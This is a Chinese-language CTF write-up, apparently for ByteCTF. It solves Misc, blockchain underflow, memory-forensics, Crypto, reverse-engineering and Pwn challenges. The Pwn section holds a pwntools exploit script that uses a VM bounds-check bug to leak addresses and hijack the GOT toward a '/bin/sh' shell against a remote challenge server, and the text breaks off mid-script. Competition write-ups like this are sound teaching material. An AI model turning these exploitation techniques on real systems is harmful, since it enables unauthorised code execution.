<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="efc4a6aaf95294c3d2033408e77301c9">Misc</h2>
<h3 data-content="1" id="2010304ac2460e466efc279a7c392d8d">Hello Bytectf</h3>
<p>签到~</p>
<h3 data-content="1" id="2c1e7155203a4df8efb1ba4562fa4bca">betgame</h3>
<p>剪刀石头布游戏，每次获胜的规则不一样但找到规律即可，3次一循环，手动打完即可。</p>
<h3 data-content="1" id="db2da87632b57238a4e6fbf011b8344d">jigsaw</h3>
<p>一堆图拼吾王。。吾王不懂人心<br/>
最后flag，S写大了可还行</p>
<h3 data-content="1" id="4fe880b4649163b2de411238988550d4">bet</h3>
<p>区块链题目，主要利用 1 + ~0x01 会下溢这一点</p>
<ol>
<li>首先profit，使balance(0x02)为 1</li>
<li>Bet() 无条件使自己变为 owner</li>
<li>0xf98b23c9 使猜测的数字变为0</li>
<li>调用一次 func_0219，要猜对，使balance变为 2，同时0x04【标志位】为1</li>
<li>调用一次 func_0219，要猜错，使balance变为 1</li>
<li>调用一次 func_03F7，猜错， 使balance 下溢</li>
<li>获得flag</li>
</ol>
<h3 data-content="1" id="29cda6d0d3b1244c16ebe2be8e825e86">hf_</h3>
<p>区块链题目，核心点依然是下溢。</p>
<ol>
<li>profit</li>
<li>0xbf1912bc 转账2 eth可变为owner</li>
<li>0x0f77e47d 转帐2，造成自己的balance下溢</li>
<li>获得flag</li>
</ol>
<h3 data-content="1" id="320034be609dcd1a57bb79657242eedd">ddd</h3>
<ol>
<li>准备 volatility 工具套件，将官方提供的Ubuntu1604.zip放置在 volatility/volatility/plugins/overlays/linux 中，之后的操作全部选择该文件包的profile</li>
<li>使用 linux_check_syscall 检查系统调用，发现 sys_read 被 HOOK，考虑 rootkit</li>
<li>linux_enumerate_files 枚举文件，发现敏感文件 /root/dddd-*.ko  /root/douyinko.ko</li>
<li>dddd-*.ko 文件存在，使用 linux_find_file 指定inode，dump文件，分析后发现仅仅是用于dump内存的kernel mod</li>
<li>douyinko.ko 已被删除，无inode信息，无法直接使用 linux_find_file dump该文件，linux_moddump总是卡死，不知道为什么</li>
<li>linux_pslist 查看进程，发现两个 sftp-server</li>
<li>使用 linux_proc_maps -p 指定 sftp，查看进程内存地址信息</li>
<li>再使用 linux_dump_map -p 2777 -s 内存地址，dump sftp-server的堆区域</li>
<li>分析堆区域的数据，发现缓存的完整 ELF 文件，为douyinko.ko</li>
<li>准备Ubuntu16.04虚拟机，降级内核至4.4.0-131</li>
<li>将导出的douyinko.ko切割到正确大小之后，insmod douyinko.ko 加载该内核</li>
<li>新建一个文件，内容为 emm....Can you find flag? （最后需要跟一个换行符或者空格，否则长度刚刚好不够用，无法通过检查）</li>
<li>使用 cc1 或 cat 或 vim 或 vi 读取新建的文件，获得最终的flag</li>
</ol>
<h2 data-content="1" id="d6a1bbb3fd908f007804f0e017b0566b">Crypto</h2>
<h3 data-content="1" id="eef4c4dd694a6823d4e539fec86e0dc1">lrlr</h3>
<p>大概是四步</p>
<ol>
<li>随机数还原，得到之后代码生成的所有 getrandbits</li>
<li>逆向lrand算法，得到 self.states</li>
<li>得到 self.states，就是c_list，最大剩余定理得到 m**17，开17得到结果</li>
<li>从seed 还原得到 flag</li>
</ol>
<p>随机数</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">oldtest</span><span class="p">():</span>
    <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">"old"</span><span class="p">,</span><span class="s2">"wb"</span><span class="p">)</span>
    <span class="n">s</span><span class="o">=</span><span class="s2">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
        <span class="n">s</span><span class="o">+=</span><span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</pre></div>
<p>可从 old 文件中取得前 1000 组 randbits<br/>
以 624 组计算得初始向量从而可以推算后续所有 randbits 方法得到值<br/>
抄个程序生成 1000 组 32bit 后面的 72 组 128bit 值</p>
<blockquote>
<p>reference <a href="https://www.anquanke.com/post/id/158894?tdsourcetag=s_pcqq_aiomsg#h2-3" target="_blank">https://www.anquanke.com/post/id/158894?tdsourcetag=s_pcqq_aiomsg#h2-3</a></p>
</blockquote>
<div class="highlight"><pre><span></span><span class="c1"># step2 get c_list</span>
<span class="k">def</span> <span class="nf">state_reverse</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">handle</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">handle</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">state</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>

<span class="n">random_list</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'p_random_128_hex.txt'</span><span class="p">,</span><span class="s1">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">random_list</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">op</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">'L'</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="n">random_list</span><span class="p">]</span>
<span class="sd">'''</span>
<span class="sd">use_list = []</span>

<span class="sd">for kk in range(80):</span>
<span class="sd">    num = 0</span>
<span class="sd">    for _ in range(4):</span>
<span class="sd">        num = num &lt;&lt; 32</span>
<span class="sd">        num += random_list[kk*4 + 3 - _]</span>
<span class="sd">    use_list.append(num)</span>

<span class="sd">random_list = use_list </span>
<span class="sd"># 读取随机数</span>
<span class="sd">'''</span>
<span class="n">l_result</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'new'</span><span class="p">,</span><span class="s1">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">l_result</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">op</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">'L'</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="n">l_result</span><span class="p">]</span>
<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">l_result</span><span class="p">)</span> <span class="o">==</span> <span class="mi">24</span>
<span class="n">state</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">)]</span>
<span class="n">old_state</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
    <span class="n">old_state</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">state_reverse</span><span class="p">(</span><span class="n">l_result</span><span class="p">[</span><span class="n">op</span><span class="p">],</span><span class="n">random_list</span><span class="p">[</span><span class="mi">48</span><span class="o">+</span><span class="n">op</span><span class="p">]))</span>

<span class="c1"># 再逆向 gen_new_states，新的states根据老states生成的</span>
<span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
    <span class="n">state</span><span class="p">[</span><span class="n">op</span><span class="p">]</span> <span class="o">=</span> <span class="n">state_reverse</span><span class="p">(</span><span class="n">old_state</span><span class="p">[</span><span class="n">op</span><span class="p">],</span> <span class="n">random_list</span><span class="p">[</span><span class="mi">24</span><span class="o">+</span><span class="n">op</span><span class="p">])</span>


<span class="c1"># print state[:24]</span>

<span class="n">c_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
    <span class="n">c_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">state</span><span class="p">[</span><span class="n">op</span><span class="p">])</span>

<span class="c1"># step3</span>

<span class="n">n_list</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'cl'</span><span class="p">,</span><span class="s1">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">n_list</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">op</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">'L'</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="n">n_list</span><span class="p">]</span>
<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">n_list</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">c_list</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">if</span> <span class="mi">0</span> <span class="o">==</span> <span class="n">b</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">a</span>
    <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">q</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">a</span> <span class="o">%</span> <span class="n">b</span><span class="p">)</span>
    <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">y</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">-</span> <span class="n">a</span> <span class="o">//</span> <span class="n">b</span> <span class="o">*</span> <span class="n">y</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">q</span>

<span class="k">def</span> <span class="nf">chinese_remainder</span><span class="p">(</span><span class="n">pairs</span><span class="p">):</span>
    <span class="n">mod_list</span><span class="p">,</span> <span class="n">remainder_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">pairs</span><span class="p">],</span> <span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">pairs</span><span class="p">]</span>
    <span class="n">mod_product</span> <span class="o">=</span> <span class="nb">reduce</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">:</span> <span class="n">x</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">mod_list</span><span class="p">)</span>
    <span class="n">mi_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">mod_product</span><span class="o">//</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">mod_list</span><span class="p">]</span>
    <span class="n">mi_inverse</span> <span class="o">=</span> <span class="p">[</span><span class="n">egcd</span><span class="p">(</span><span class="n">mi_list</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">mod_list</span><span class="p">[</span><span class="n">i</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">mi_list</span><span class="p">))]</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">remainder_list</span><span class="p">)):</span>
        <span class="n">x</span> <span class="o">+=</span> <span class="n">mi_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">*</span> <span class="n">mi_inverse</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">*</span> <span class="n">remainder_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="n">x</span> <span class="o">%=</span> <span class="n">mod_product</span>
    <span class="k">return</span> <span class="n">x</span>

<span class="n">params</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">op</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
    <span class="n">params</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="n">n_list</span><span class="p">[</span><span class="n">op</span><span class="p">],</span><span class="n">c_list</span><span class="p">[</span><span class="n">op</span><span class="p">]])</span>

<span class="n">k</span> <span class="o">=</span> <span class="n">chinese_remainder</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>

<span class="k">print</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">iroot</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="mi">17</span><span class="p">)</span>

<span class="n">init_state</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">iroot</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="mi">17</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</pre></div>
<p>得到的init_state，反复使用原函数加密即可得到flag</p>
<div class="highlight"><pre><span></span><span class="c1"># coding:utf-8</span>

<span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">num</span> <span class="o">=</span> <span class="mi">61406796444626535559771097418338494728649815464609781204026855332620301752444</span>
<span class="k">def</span> <span class="nf">generate_init_state</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">bin</span><span class="p">(</span><span class="n">seed</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]:</span>
        <span class="n">a</span> <span class="o">=</span> <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)):</span>
            <span class="n">a</span> <span class="o">=</span> <span class="n">a</span> <span class="o">^</span> <span class="n">seed</span>
        <span class="k">if</span> <span class="n">a</span> <span class="o">&gt;&gt;</span> <span class="mi">256</span><span class="p">:</span>
            <span class="n">a</span> <span class="o">=</span> <span class="n">a</span> <span class="o">^</span> <span class="mh">0x10000000000000000000000000000000000000000000000000000000000000223</span>
    <span class="c1">#print 'a(init_state)',a</span>
    <span class="k">return</span> <span class="n">a</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000000</span><span class="p">):</span>
    <span class="n">num</span> <span class="o">=</span> <span class="n">generate_init_state</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
    <span class="k">if</span> <span class="s1">'flag'</span> <span class="ow">in</span> <span class="n">tmp</span> <span class="ow">or</span> <span class="s1">'byte'</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">tmp</span>
</pre></div>
<h2 data-content="1" id="73a727d33406b4f2295e988b0a02695e">Re</h2>
<h3 data-content="1" id="52d31c9ab9ac59b6a2b4bb9e12b71392">驱动逆向</h3>
<p>题目中指定了CPU为FakeIntel。同时又给定了长度为0x10的key<br/>
将上述数据分别赋值到0x140006070和0x14006890处。<br/>
使用peloader加载程序执行解密逻辑即可得到flag<br/>
bytectf{d0f20eff6fc4f6060776c8ca63319a1e}</p>
<h2 data-content="1" id="6e288f75470a1c739a23c9f69933dfdc">Pwn</h2>
<h3 data-content="1" id="4839df2460eb22d9932ada11c8230a0f">ezarch</h3>
<p>和拟态防御的simplevm类似的虚拟机题目。本题在运行自定义opcode的时候对ebp进行检查时，使用了错误的参数，导致ebp可以越界读写，从而修改结构体中保存的虚拟栈基地址，进而劫持got表。</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'tmux'</span><span class="p">,</span> <span class="s1">'split'</span><span class="p">,</span> <span class="s1">'-h'</span><span class="p">]</span>


<span class="k">def</span> <span class="nf">memory_set</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">eip</span><span class="p">,</span> <span class="n">esp</span><span class="p">,</span> <span class="n">ebp</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'M'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'size&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'size&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">')'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'eip&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">eip</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'esp&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">esp</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'ebp&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ebp</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'R'</span><span class="p">)</span>


<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>

<span class="c1">#p = process('ezarch')</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'112.126.102.73'</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>

<span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

<span class="c1"># get heap addr(r14 r15) and elf addr(r12 r13)</span>
<span class="n">payload</span>  <span class="o">=</span> <span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x22</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>    <span class="c1"># mov [ebp] =&gt; [esp]</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x0A\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>      <span class="c1"># pop [esp] =&gt; r15</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x01\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1004</span><span class="p">)</span>   <span class="c1"># add 0x1004 =&gt; r0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>       <span class="c1"># mov r0 =&gt; ebp</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x22</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>    <span class="c1"># mov [ebp] =&gt; [esp]</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x0A\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xE</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>      <span class="c1"># pop [esp] =&gt; r14</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x02\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1004</span><span class="p">)</span>   <span class="c1"># sub 0x1004 =&gt; r0 ; set r0 to 0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x01\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1008</span><span class="p">)</span>   <span class="c1"># add 0x1008 =&gt; r0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>       <span class="c1"># mov r0 =&gt; ebp</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x22</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>    <span class="c1"># mov [ebp] =&gt; [esp]</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x0A\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xD</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>      <span class="c1"># pop [esp] =&gt; r13</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x02\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1008</span><span class="p">)</span>   <span class="c1"># sub 0x1008 =&gt; r0 ; set r0 to 0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x01\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100C</span><span class="p">)</span>   <span class="c1"># add 0x100C =&gt; r0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>       <span class="c1"># mov r0 =&gt; ebp</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x22</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>    <span class="c1"># mov [ebp] =&gt; [esp]</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x0A\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xC</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>      <span class="c1"># pop [esp] =&gt; r12</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x02\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100C</span><span class="p">)</span>   <span class="c1"># sub 0x100C =&gt; r0 ; set r0 to 0</span>

<span class="c1"># change stack base</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x01\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1008</span><span class="p">)</span>   <span class="c1"># add 0x1008 =&gt; r0</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>       <span class="c1"># mov r0 =&gt; ebp</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span>       <span class="c1"># mov r13 =&gt; r1</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x02\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">)</span>     <span class="c1"># sub 0xa8 =&gt; r1 ; free@got</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x02</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>       <span class="c1"># mov r1 =&gt; [ebp]</span>

<span class="c1"># get libc r10,r11</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'</span><span class="se">\x02\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1008</span><span class="p">)</span>   <span class="c1"># sub 0x1008 =&gt; r0 ; set r0 to 0</span>
